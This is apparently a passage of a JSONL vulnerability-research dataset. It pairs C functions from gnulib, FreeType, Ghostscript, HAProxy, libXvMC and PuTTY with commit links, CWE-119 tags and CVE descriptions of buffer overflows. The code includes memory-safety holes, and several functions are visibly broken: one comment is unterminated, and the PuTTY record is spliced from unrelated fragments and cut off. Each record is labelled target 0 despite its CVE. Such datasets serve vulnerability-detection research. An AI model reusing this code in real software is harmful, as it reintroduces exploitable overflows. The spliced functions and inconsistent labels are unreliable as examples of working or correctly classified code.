last tomorrow\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 -4 today\";\n  ASSERT (!parse_datetime (&result, p, &now));\n\n  /* And check correct usage of dayshifts */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+400 tomorrow\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+400 +1 day\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  p = \"UTC+400 1 day hence\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+400 yesterday\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+400 1 day ago\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+400 now\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+400 +0 minutes\"; /* silly, but simple \"UTC+400\" is different*/\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  /* Check that some \"next Monday\", \"last Wednesday\", etc. are correct.  */\n  setenv (\"TZ\", \"UTC0\", 1);\n  for (i = 0; day_table[i]; i++)\n    {\n      unsigned int thur2 = 7 * 24 * 3600; /* 2nd thursday */\n      char tmp[32];\n      sprintf (tmp, \"NEXT %s\", day_table[i]);\n      now.tv_sec = thur2 + 4711;\n      now.tv_nsec = 1267;\n      ASSERT (parse_datetime (&result, tmp, &now));\n      LOG (tmp, now, result);\n      ASSERT (result.tv_nsec == 0);\n      ASSERT (result.tv_sec == thur2 + (i == 4 ? 7 : (i + 3) % 7) * 24 * 3600);\n\n      sprintf (tmp, \"LAST %s\", day_table[i]);\n      now.tv_sec = thur2 + 4711;\n      now.tv_nsec = 1267;\n      ASSERT (parse_datetime (&result, tmp, &now));\n      LOG (tmp, now, result);\n      ASSERT (result.tv_nsec == 0);\n      ASSERT (result.tv_sec == thur2 + ((i + 3) % 7 - 7) * 24 * 3600);\n    }\n\n  p = \"THURSDAY UTC+00\";  /* The epoch was on Thursday.  */\n  now.tv_sec = 0;\n  now.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (result.tv_sec == now.tv_sec\n          && result.tv_nsec == now.tv_nsec);\n\n  p = \"FRIDAY UTC+00\";\n  now.tv_sec = 0;\n  now.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (result.tv_sec == 24 * 3600\n          && result.tv_nsec == now.tv_nsec);\n\n  /* Exercise a sign-extension bug.  Before July 2012, an input\n     starting with a high-bit-set byte would be treated like \"0\".  */\n  ASSERT ( ! parse_datetime (&result, \"\\xb0\", &now));\n\n  /* Exercise TZ=\"\" parsing code.  */\n  /* These two would infloop or segfault before Feb 2014.  */\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\"\\\"\", &now));\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\" \\\"\", &now));\n  /* Exercise invalid patterns.  */\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\", &now));\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\\\\\"\", &now));\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\\n\", &now));\n  ASSERT ( ! parse_datetime (&result, \"TZ=\\\"\\\\n\\\"\", &now));\n  /* Exercise valid patterns.  */\n  ASSERT (   parse_datetime (&result, \"TZ=\\\"\\\"\", &now));\n  ASSERT (   parse_datetime (&result, \"TZ=\\\"\\\" \", &now));\n  ASSERT (   parse_datetime (&result, \" TZ=\\\"\\\"\", &now));\n   ASSERT (   parse_datetime (&result, \"TZ=\\\"\\\\\\\\\\\"\", &now));\n   ASSERT (   parse_datetime (&result, \"TZ=\\\"\\\\\\\"\\\"\", &now));\n \n  /* Outlandishly-long time zone abbreviations should not cause problems.  */\n  {\n    static char const bufprefix[] = \"TZ=\\\"\";\n    enum { tzname_len = 2000 };\n    static char const bufsuffix[] = \"0\\\" 1970-01-01 01:02:03.123456789\";\n    enum { bufsize = sizeof bufprefix - 1 + tzname_len + sizeof bufsuffix };\n    char buf[bufsize];\n    memcpy (buf, bufprefix, sizeof bufprefix - 1);\n    memset (buf + sizeof bufprefix - 1, 'X', tzname_len);\n    strcpy (buf + bufsize - sizeof bufsuffix, bufsuffix);\n    ASSERT (parse_datetime (&result, buf, &now));\n    LOG (buf, now, result);\n    ASSERT (result.tv_sec == 1 * 60 * 60 + 2 * 60 + 3\n            && result.tv_nsec == 123456789);\n  }\n\n   return 0;\n }\n", "func_hash": 254772284669524418106772745534242359013, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-7476", "cve_desc": "Gnulib before 2017-04-26 has a heap-based buffer overflow with the TZ environment variable. The error is in the save_abbr function in time_rz.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-7476"}
{"idx": 158077, "project": "savannah", "commit_id": "59eb9f8cfe7d1df379a2318316d1f04f80fba54a", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=59eb9f8cfe7d1df379a2318316d1f04f80fba54a", "commit_message": "None", "target": 0, "func": "  ft_var_readpackedpoints( FT_Stream  stream,\n                           FT_UInt   *point_cnt )\n  {\n    FT_UShort *points;\n    FT_Int     n;\n    FT_Int     runcnt;\n    FT_Int     i;\n     FT_Int     j;\n     FT_Int     first;\n     FT_Memory  memory = stream->memory;\n    FT_Error   error  = TT_Err_Ok;\n \n     FT_UNUSED( error );\n \n\n    *point_cnt = n = FT_GET_BYTE();\n    if ( n == 0 )\n      return ALL_POINTS;\n\n    if ( n & GX_PT_POINTS_ARE_WORDS )\n      n = FT_GET_BYTE() | ( ( n & GX_PT_POINT_RUN_COUNT_MASK ) << 8 );\n\n    if ( FT_NEW_ARRAY( points, n ) )\n      return NULL;\n\n    i = 0;\n    while ( i < n )\n    {\n      runcnt = FT_GET_BYTE();\n      if ( runcnt & GX_PT_POINTS_ARE_WORDS )\n      {\n         runcnt = runcnt & GX_PT_POINT_RUN_COUNT_MASK;\n         first  = points[i++] = FT_GET_USHORT();\n \n        if ( runcnt < 1 || i + runcnt >= n )\n           goto Exit;\n \n         /* first point not included in runcount */\n        for ( j = 0; j < runcnt; ++j )\n          points[i++] = (FT_UShort)( first += FT_GET_USHORT() );\n      }\n      else\n       {\n         first = points[i++] = FT_GET_BYTE();\n \n        if ( runcnt < 1 || i + runcnt >= n )\n           goto Exit;\n \n         for ( j = 0; j < runcnt; ++j )\n          points[i++] = (FT_UShort)( first += FT_GET_BYTE() );\n      }\n    }\n\n  Exit:\n    return points;\n  }\n", "func_hash": 179208058990458728256307235003655306316, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2010-3855", "cve_desc": "Buffer overflow in the ft_var_readpackedpoints function in truetype/ttgxvar.c in FreeType 2.4.3 and earlier allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted TrueType GX font.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-3855"}
{"idx": 158078, "project": "ghostscript", "commit_id": "39b1e54b2968620723bf32e96764c88797714879", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=39b1e54b2968620723bf32e96764c88797714879", "commit_message": "None", "target": 0, "func": " set_text_distance(gs_point *pdist, double dx, double dy, const gs_matrix *pmat)\n {\n    int code;\n     double rounded;\n \n    if (dx > 1e38 || dy > 1e38)\n        code = gs_error_undefinedresult;\n    else\n        code = gs_distance_transform_inverse(dx, dy, pmat, pdist);\n\n     if (code == gs_error_undefinedresult) {\n         /* The CTM is degenerate.\n            Can't know the distance in user space.\n    } else if (code < 0)\n        return code;\n    /* If the distance is very close to integers, round it. */\n    if (fabs(pdist->x - (rounded = floor(pdist->x + 0.5))) < 0.0005)\n        pdist->x = rounded;\n    if (fabs(pdist->y - (rounded = floor(pdist->y + 0.5))) < 0.0005)\n        pdist->y = rounded;\n    return 0;\n}\n", "func_hash": 59940488774012010522720030779464241139, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2018-10194", "cve_desc": "The set_text_distance function in devices/vector/gdevpdts.c in the pdfwrite component in Artifex Ghostscript through 9.22 does not prevent overflows in text-positioning calculation, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted PDF document.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2018-10194"}
{"idx": 158079, "project": "haproxy", "commit_id": "3f0e1ec70173593f4c2b3681b26c04a4ed5fc588", "project_url": "https://github.com/haproxy/haproxy", "commit_url": "http://git.haproxy.org/?p=haproxy.git;a=commitdiff;h=3f0e1ec70173593f4c2b3681b26c04a4ed5fc588", "commit_message": "BUG/CRITICAL: h2: fix incorrect frame length check\n\nThe incoming H2 frame length was checked against the max_frame_size\nsetting instead of being checked against the bufsize. The max_frame_size\nonly applies to outgoing traffic and not to incoming one, so if a large\nenough frame size is advertised in the SETTINGS frame, a wrapped frame\nwill be defragmented into a temporary allocated buffer where the second\nfragment my overflow the heap by up to 16 kB.\n\nIt is very unlikely that this can be exploited for code execution given\nthat buffers are very short lived and their address not realistically\npredictable in production, but the likeliness of an immediate crash is\nabsolutely certain.\n\nThis fix must be backported to 1.8.\n\nMany thanks to Jordan Zebor from F5 Networks for reporting this issue\nin a responsible way.", "target": 0, "func": "static void h2_process_demux(struct h2c *h2c)\n{\n\tstruct h2s *h2s;\n\n\tif (h2c->st0 >= H2_CS_ERROR)\n\t\treturn;\n\n\tif (unlikely(h2c->st0 < H2_CS_FRAME_H)) {\n\t\tif (h2c->st0 == H2_CS_PREFACE) {\n\t\t\tif (unlikely(h2c_frt_recv_preface(h2c) <= 0)) {\n\t\t\t\t/* RFC7540#3.5: a GOAWAY frame MAY be omitted */\n\t\t\t\tif (h2c->st0 == H2_CS_ERROR)\n\t\t\t\t\th2c->st0 = H2_CS_ERROR2;\n\t\t\t\tgoto fail;\n\t\t\t}\n\n\t\t\th2c->max_id = 0;\n\t\t\th2c->st0 = H2_CS_SETTINGS1;\n\t\t}\n\n\t\tif (h2c->st0 == H2_CS_SETTINGS1) {\n\t\t\tstruct h2_fh hdr;\n\n\t\t\t/* ensure that what is pending is a valid SETTINGS frame\n\t\t\t * without an ACK.\n\t\t\t */\n\t\t\tif (!h2_get_frame_hdr(h2c->dbuf, &hdr)) {\n\t\t\t\t/* RFC7540#3.5: a GOAWAY frame MAY be omitted */\n\t\t\t\tif (h2c->st0 == H2_CS_ERROR)\n\t\t\t\t\th2c->st0 = H2_CS_ERROR2;\n\t\t\t\tgoto fail;\n\t\t\t}\n\n\t\t\tif (hdr.sid || hdr.ft != H2_FT_SETTINGS || hdr.ff & H2_F_SETTINGS_ACK) {\n\t\t\t\t/* RFC7540#3.5: a GOAWAY frame MAY be omitted */\n\t\t\t\th2c_error(h2c, H2_ERR_PROTOCOL_ERROR);\n\t\t\t\th2c->st0 = H2_CS_ERROR2;\n                                goto fail;\n                        }\n \n                       if ((int)hdr.len < 0 || (int)hdr.len > global.tune.bufsize) {\n                                /* RFC7540#3.5: a GOAWAY frame MAY be omitted */\n                                h2c_error(h2c, H2_ERR_FRAME_SIZE_ERROR);\n                                h2c->st0 = H2_CS_ERROR2;\n\t\t\t\tgoto fail;\n\t\t\t}\n\n\t\t\t/* that's OK, switch to FRAME_P to process it */\n\t\t\th2c->dfl = hdr.len;\n\t\t\th2c->dsi = hdr.sid;\n\t\t\th2c->dft = hdr.ft;\n\t\t\th2c->dff = hdr.ff;\n\t\t\th2c->dpl = 0;\n\t\t\th2c->st0 = H2_CS_FRAME_P;\n\t\t}\n\t}\n\n\t/* process as many incoming frames as possible below */\n\twhile (h2c->dbuf->i) {\n\t\tint ret = 0;\n\n\t\tif (h2c->st0 >= H2_CS_ERROR)\n\t\t\tbreak;\n\n\t\tif (h2c->st0 == H2_CS_FRAME_H) {\n\t\t\tstruct h2_fh hdr;\n\n                        if (!h2_peek_frame_hdr(h2c->dbuf, &hdr))\n                                break;\n \n                       if ((int)hdr.len < 0 || (int)hdr.len > global.tune.bufsize) {\n                                h2c_error(h2c, H2_ERR_FRAME_SIZE_ERROR);\n                                h2c->st0 = H2_CS_ERROR;\n                                break;\n\t\t\t}\n\n\t\t\th2c->dfl = hdr.len;\n\t\t\th2c->dsi = hdr.sid;\n\t\t\th2c->dft = hdr.ft;\n\t\t\th2c->dff = hdr.ff;\n\t\t\th2c->dpl = 0;\n\t\t\th2c->st0 = H2_CS_FRAME_P;\n\t\t\th2_skip_frame_hdr(h2c->dbuf);\n\t\t}\n\n\t\t/* Only H2_CS_FRAME_P and H2_CS_FRAME_A here */\n\t\th2s = h2c_st_by_id(h2c, h2c->dsi);\n\n\t\tif (h2c->st0 == H2_CS_FRAME_E)\n\t\t\tgoto strm_err;\n\n\t\tif (h2s->st == H2_SS_IDLE &&\n\t\t    h2c->dft != H2_FT_HEADERS && h2c->dft != H2_FT_PRIORITY) {\n\t\t\t/* RFC7540#5.1: any frame other than HEADERS or PRIORITY in\n\t\t\t * this state MUST be treated as a connection error\n\t\t\t */\n\t\t\th2c_error(h2c, H2_ERR_PROTOCOL_ERROR);\n\t\t\th2c->st0 = H2_CS_ERROR;\n\t\t\tbreak;\n\t\t}\n\n\t\tif (h2s->st == H2_SS_HREM && h2c->dft != H2_FT_WINDOW_UPDATE &&\n\t\t    h2c->dft != H2_FT_RST_STREAM && h2c->dft != H2_FT_PRIORITY) {\n\t\t\t/* RFC7540#5.1: any frame other than WU/PRIO/RST in\n\t\t\t * this state MUST be treated as a stream error\n\t\t\t */\n\t\t\th2s_error(h2s, H2_ERR_STREAM_CLOSED);\n\t\t\th2c->st0 = H2_CS_FRAME_E;\n\t\t\tgoto strm_err;\n\t\t}\n\n\t\t/* Below the management of frames received in closed state is a\n\t\t * bit hackish because the spec makes strong differences between\n\t\t * streams closed by receiving RST, sending RST, and seeing ES\n\t\t * in both directions. In addition to this, the creation of a\n\t\t * new stream reusing the identifier of a closed one will be\n\t\t * detected here. Given that we cannot keep track of all closed\n\t\t * streams forever, we consider that unknown closed streams were\n\t\t * closed on RST received, which allows us to respond with an\n\t\t * RST without breaking the connection (eg: to abort a transfer).\n\t\t * Some frames have to be silently ignored as well.\n\t\t */\n\t\tif (h2s->st == H2_SS_CLOSED && h2c->dsi) {\n\t\t\tif (h2c->dft == H2_FT_HEADERS || h2c->dft == H2_FT_PUSH_PROMISE) {\n\t\t\t\t/* #5.1.1: The identifier of a newly\n\t\t\t\t * established stream MUST be numerically\n\t\t\t\t * greater than all streams that the initiating\n\t\t\t\t * endpoint has opened or reserved. This\n\t\t\t\t * governs streams that are opened using a\n\t\t\t\t * HEADERS frame and streams that are reserved\n\t\t\t\t * using PUSH_PROMISE. An endpoint that\n\t\t\t\t * receives an unexpected stream identifier\n\t\t\t\t * MUST respond with a connection error.\n\t\t\t\t */\n\t\t\t\th2c_error(h2c, H2_ERR_STREAM_CLOSED);\n\t\t\t\tgoto strm_err;\n\t\t\t}\n\n\t\t\tif (h2s->flags & H2_SF_RST_RCVD) {\n\t\t\t\t/* RFC7540#5.1:closed: an endpoint that\n\t\t\t\t * receives any frame other than PRIORITY after\n\t\t\t\t * receiving a RST_STREAM MUST treat that as a\n\t\t\t\t * stream error of type STREAM_CLOSED.\n\t\t\t\t *\n\t\t\t\t * Note that old streams fall into this category\n\t\t\t\t * and will lead to an RST being sent.\n\t\t\t\t */\n\t\t\t\th2s_error(h2s, H2_ERR_STREAM_CLOSED);\n\t\t\t\th2c->st0 = H2_CS_FRAME_E;\n\t\t\t\tgoto strm_err;\n\t\t\t}\n\n\t\t\t/* RFC7540#5.1:closed: if this state is reached as a\n\t\t\t * result of sending a RST_STREAM frame, the peer that\n\t\t\t * receives the RST_STREAM might have already sent\n\t\t\t * frames on the stream that cannot be withdrawn. An\n\t\t\t * endpoint MUST ignore frames that it receives on\n\t\t\t * closed streams after it has sent a RST_STREAM\n\t\t\t * frame. An endpoint MAY choose to limit the period\n\t\t\t * over which it ignores frames and treat frames that\n\t\t\t * arrive after this time as being in error.\n\t\t\t */\n\t\t\tif (!(h2s->flags & H2_SF_RST_SENT)) {\n\t\t\t\t/* RFC7540#5.1:closed: any frame other than\n\t\t\t\t * PRIO/WU/RST in this state MUST be treated as\n\t\t\t\t * a connection error\n\t\t\t\t */\n\t\t\t\tif (h2c->dft != H2_FT_RST_STREAM &&\n\t\t\t\t    h2c->dft != H2_FT_PRIORITY &&\n\t\t\t\t    h2c->dft != H2_FT_WINDOW_UPDATE) {\n\t\t\t\t\th2c_error(h2c, H2_ERR_STREAM_CLOSED);\n\t\t\t\t\tgoto strm_err;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n#if 0\n\n\t\t/* graceful shutdown, ignore streams whose ID is higher than\n\t\t * the one advertised in GOAWAY. RFC7540#6.8.\n\t\t */\n\t\tif (unlikely(h2c->last_sid >= 0) && h2c->dsi > h2c->last_sid) {\n\t\t\tret = MIN(h2c->dbuf->i, h2c->dfl);\n\t\t\tbi_del(h2c->dbuf, ret);\n\t\t\th2c->dfl -= ret;\n\t\t\tret = h2c->dfl == 0;\n\t\t\tgoto strm_err;\n\t\t}\n#endif\n\n\t\tswitch (h2c->dft) {\n\t\tcase H2_FT_SETTINGS:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_settings(h2c);\n\n\t\t\tif (h2c->st0 == H2_CS_FRAME_A)\n\t\t\t\tret = h2c_ack_settings(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_PING:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_ping(h2c);\n\n\t\t\tif (h2c->st0 == H2_CS_FRAME_A)\n\t\t\t\tret = h2c_ack_ping(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_WINDOW_UPDATE:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_window_update(h2c, h2s);\n\t\t\tbreak;\n\n\t\tcase H2_FT_CONTINUATION:\n\t\t\t/* we currently don't support CONTINUATION frames since\n\t\t\t * we have nowhere to store the partial HEADERS frame.\n\t\t\t * Let's abort the stream on an INTERNAL_ERROR here.\n\t\t\t */\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P) {\n\t\t\t\th2s_error(h2s, H2_ERR_INTERNAL_ERROR);\n\t\t\t\th2c->st0 = H2_CS_FRAME_E;\n\t\t\t}\n\t\t\tbreak;\n\n\t\tcase H2_FT_HEADERS:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_frt_handle_headers(h2c, h2s);\n\t\t\tbreak;\n\n\t\tcase H2_FT_DATA:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_frt_handle_data(h2c, h2s);\n\n\t\t\tif (h2c->st0 == H2_CS_FRAME_A)\n\t\t\t\tret = h2c_send_strm_wu(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_PRIORITY:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_priority(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_RST_STREAM:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_rst_stream(h2c, h2s);\n\t\t\tbreak;\n\n\t\tcase H2_FT_GOAWAY:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_goaway(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_PUSH_PROMISE:\n\t\t\t/* not permitted here, RFC7540#5.1 */\n\t\t\th2c_error(h2c, H2_ERR_PROTOCOL_ERROR);\n\t\t\tbreak;\n\n\t\t\t/* implement all extra frame types here */\n\t\tdefault:\n\t\t\t/* drop frames that we ignore. They may be larger than\n\t\t\t * the buffer so we drain all of their contents until\n\t\t\t * we reach the end.\n\t\t\t */\n\t\t\tret = MIN(h2c->dbuf->i, h2c->dfl);\n\t\t\tbi_del(h2c->dbuf, ret);\n\t\t\th2c->dfl -= ret;\n\t\t\tret = h2c->dfl == 0;\n\t\t}\n\n\tstrm_err:\n\t\t/* We may have to send an RST if not done yet */\n\t\tif (h2s->st == H2_SS_ERROR)\n\t\t\th2c->st0 = H2_CS_FRAME_E;\n\n\t\tif (h2c->st0 == H2_CS_FRAME_E)\n\t\t\tret = h2c_send_rst_stream(h2c, h2s);\n\n\t\t/* error or missing data condition met above ? */\n\t\tif (ret <= 0)\n\t\t\tbreak;\n\n\t\tif (h2c->st0 != H2_CS_FRAME_H) {\n\t\t\tbi_del(h2c->dbuf, h2c->dfl);\n\t\t\th2c->st0 = H2_CS_FRAME_H;\n\t\t}\n\t}\n\n\tif (h2c->rcvd_c > 0 &&\n\t    !(h2c->flags & (H2_CF_MUX_MFULL | H2_CF_DEM_MBUSY | H2_CF_DEM_MROOM)))\n\t\th2c_send_conn_wu(h2c);\n\n fail:\n\t/* we can go here on missing data, blocked response or error */\n\treturn;\n}\n", "func_hash": 78211051505197321979153553871570809611, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2018-10184", "cve_desc": "An issue was discovered in HAProxy before 1.8.8. The incoming H2 frame length was checked against the max_frame_size setting instead of being checked against the bufsize. The max_frame_size only applies to outgoing traffic and not to incoming, so if a large enough frame size is advertised in the SETTINGS frame, a wrapped frame will be defragmented into a temporary allocated buffer where the second fragment may overflow the heap by up to 16 kB. It is very unlikely that this can be exploited for code execution given that buffers are very short lived and their addresses not realistically predictable in production, but the likelihood of an immediate crash is absolutely certain.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2018-10184"}
{"idx": 158083, "project": "libXvMC", "commit_id": "2cd95e7da8367cccdcdd5c9b160012d1dec5cbdb", "project_url": "https://cgit.freedesktop.org/xorg/lib/libXvMC/commit/?id=2cd95e7da8367cccdcdd5c9b160012d1dec5cbdb", "commit_url": "https://cgit.freedesktop.org/xorg/lib/libXvMC/commit/?id=2cd95e7da8367cccdcdd5c9b160012d1dec5cbdb", "commit_message": "None", "target": 0, "func": "Status XvMCGetDRInfo(Display *dpy, XvPortID port,\n\t\t     char **name, char **busID,\n\t\t     int *major, int *minor,\n\t\t     int *patchLevel,\n\t\t     int *isLocal)\n{\n    XExtDisplayInfo *info = xvmc_find_display(dpy);\n    xvmcGetDRInfoReply rep;\n    xvmcGetDRInfoReq  *req;\n    CARD32 magic;\n\n#ifdef HAVE_SHMAT\n    volatile CARD32 *shMem;\n    struct timezone here;\n    struct timeval now;\n    here.tz_minuteswest = 0;\n    here.tz_dsttime = 0;\n#endif\n\n    *name = NULL;\n    *busID = NULL;\n\n    XvMCCheckExtension (dpy, info, BadImplementation);\n\n    LockDisplay (dpy);\n    XvMCGetReq (GetDRInfo, req);\n\n    req->port = port;\n    magic = 0;\n    req->magic = 0;\n#ifdef HAVE_SHMAT\n    req->shmKey = shmget(IPC_PRIVATE, 1024, IPC_CREAT | 0600);\n\n    /*\n     * We fill a shared memory page with a repetitive pattern. If the\n     * X server can read this pattern, we probably have a local connection.\n     * Note that we can trigger the remote X server to read any shared\n     * page on the remote machine, so we shouldn't be able to guess and verify\n     * any complicated data on those pages. Thats the explanation of this\n     * otherwise stupid-looking pattern algorithm.\n     */\n\n    if (req->shmKey >= 0) {\n\tshMem = (CARD32 *) shmat(req->shmKey, NULL, 0);\n\tshmctl( req->shmKey, IPC_RMID, NULL);\n\tif ( shMem ) {\n\n\t    register volatile CARD32 *shMemC = shMem;\n\t    register int i;\n\n\t    gettimeofday( &now, &here);\n\t    magic = now.tv_usec & 0x000FFFFF;\n\t    req->magic = magic;\n\t    i = 1024 / sizeof(CARD32);\n\t    while(i--) {\n\t        *shMemC++ = magic;\n\t        magic = ~magic;\n\t    }\n\t} else {\n\t    req->shmKey = -1;\n\t}\n    }\n#else\n    req->shmKey = 0;\n#endif\n    if (!_XReply (dpy, (xReply *) &rep, 0, xFalse)) {\n        UnlockDisplay (dpy);\n        SyncHandle ();\n#ifdef HAVE_SHMAT\n\tif ( req->shmKey >= 0) {\n\t    shmdt( (const void *) shMem );\n\t}\n#endif\n        return -1;\n    }\n#ifdef HAVE_SHMAT\n    shmdt( (const void *) shMem );\n#endif\n\n    if (rep.length > 0) {\n\tunsigned long realSize = 0;\n\tchar *tmpBuf = NULL;\n\n\tif ((rep.length < (INT_MAX >> 2)) &&\n\t    /* protect against overflow in strncpy below */\n\t    (rep.nameLen + rep.busIDLen > rep.nameLen)) {\n\t    realSize = rep.length << 2;\n\t    if (realSize >= (rep.nameLen + rep.busIDLen)) {\n\t\ttmpBuf = Xmalloc(realSize);\n\t\t*name = Xmalloc(rep.nameLen);\n\t\t*busID = Xmalloc(rep.busIDLen);\n\t    }\n\t}\n\n \tif (*name && *busID && tmpBuf) {\n \t    _XRead(dpy, tmpBuf, realSize);\n \t    strncpy(*name,tmpBuf,rep.nameLen);\n\t    (*name)[rep.nameLen == 0 ? 0 : rep.nameLen - 1] = '\\0';\n \t    strncpy(*busID,tmpBuf+rep.nameLen,rep.busIDLen);\n\t    (*busID)[rep.busIDLen == 0 ? 0 : rep.busIDLen - 1] = '\\0';\n \t    XFree(tmpBuf);\n \t} else {\n \t    XFree(*name);\n\t    *name = NULL;\n\t    XFree(*busID);\n\t    *busID = NULL;\n\t    XFree(tmpBuf);\n\n\t    _XEatDataWords(dpy, rep.length);\n\t    UnlockDisplay (dpy);\n\t    SyncHandle ();\n\t    return -1;\n\n\t}\n    }\n\n    UnlockDisplay (dpy);\n    SyncHandle ();\n    *major = rep.major;\n    *minor = rep.minor;\n    *patchLevel = rep.patchLevel;\n    *isLocal = (req->shmKey > 0) ? rep.isLocal : 1;\n    return (rep.length > 0) ? Success : BadImplementation;\n}\n", "func_hash": 134961230573839871155626004817245283432, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-7953", "cve_desc": "Buffer underflow in X.org libXvMC before 1.0.10 allows remote X servers to have unspecified impact via an empty string.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-7953"}
{"idx": 158093, "project": "tartarus", "commit_id": "4ff22863d895cb7ebfced4cf923a012a614adaa8", "project_url": "https://git.tartarus.org/?p=simon/putty", "commit_url": "https://git.tartarus.org/?p=simon/putty.git;a=commitdiff;h=4ff22863d895cb7ebfced4cf923a012a614adaa8", "commit_message": "None", "target": 0, "func": "static void ssh_throttle_all(Ssh ssh, int enable, int bufsize)\n{\n    int i;\n    struct ssh_channel *c;\n\n    if (enable == ssh->throttled_all)\n\treturn;\n    ssh->throttled_all = enable;\n    ssh->overall_bufsize = bufsize;\n    if (!ssh->channels)\n\treturn;\n    for (i = 0; NULL != (c = index234(ssh->channels, i)); i++) {\n\tswitch (c->type) {\n\t  case CHAN_MAINSESSION:\n\t    /*\n\t     * This is treated separately, outside the switch.\n\t     */\n\t    break;\n            x11_override_throttle(c->u.x11.xconn, enable);\n            break;\n          case CHAN_AGENT:\n           /* Agent forwarding channels are buffer-managed by\n             * checking ssh->throttled_all in ssh_agentf_try_forward.\n             * So at the moment we _un_throttle again, we must make an\n             * attempt to do something. */\n            if (!enable)\n                ssh_agentf_try_forward(c);\n            break;\n          case CHAN_SOCKDATA:\n            pfd_override_throttle(c->u.pfd.pf, enable);\n\nstatic void ssh_agent_callback(void *sshv, void *reply, int replylen)\n{\n    Ssh ssh = (Ssh) sshv;\n\n    ssh->auth_agent_query = NULL;\n\n    ssh->agent_response = reply;\n    ssh->agent_response_len = replylen;\n\n    if (ssh->version == 1)\n\tdo_ssh1_login(ssh, NULL, -1, NULL);\n    else\n\tdo_ssh2_authconn(ssh, NULL, -1, NULL);\n}\n\nstatic void ssh_dialog_callback(void *sshv, int ret)\n{\n    Ssh ssh = (Ssh) sshv;\n\n    ssh->user_response = ret;\n\n    if (ssh->version == 1)\n\tdo_ssh1_login(ssh, NULL, -1, NULL);\n    else\n\tdo_ssh2_transport(ssh, NULL, -1, NULL);\n\n    /*\n     * This may have unfrozen the SSH connection, so do a\n     * queued-data run.\n     */\n    ssh_process_queued_incoming_data(ssh);\n}\n\nstatic void ssh_agentf_callback(void *cv, void *reply, int replylen)\n     ssh_process_queued_incoming_data(ssh);\n }\n \nstatic void ssh_agentf_got_response(struct ssh_channel *c,\n                                    void *reply, int replylen)\n {\n     c->u.a.pending = NULL;\n\n    if (!reply) {\n       /* The real agent didn't send any kind of reply at all for\n         * some reason, so fake an SSH_AGENT_FAILURE. */\n       reply = \"\\0\\0\\0\\1\\5\";\n        replylen = 5;\n     }\n\n    ssh_send_channel_data(c, reply, replylen);\n}\n\nstatic void ssh_agentf_callback(void *cv, void *reply, int replylen);\n\nstatic void ssh_agentf_try_forward(struct ssh_channel *c)\n{\n    unsigned datalen, lengthfield, messagelen;\n    unsigned char *message;\n    unsigned char msglen[4];\n    void *reply;\n    int replylen;\n\n     /*\n     * 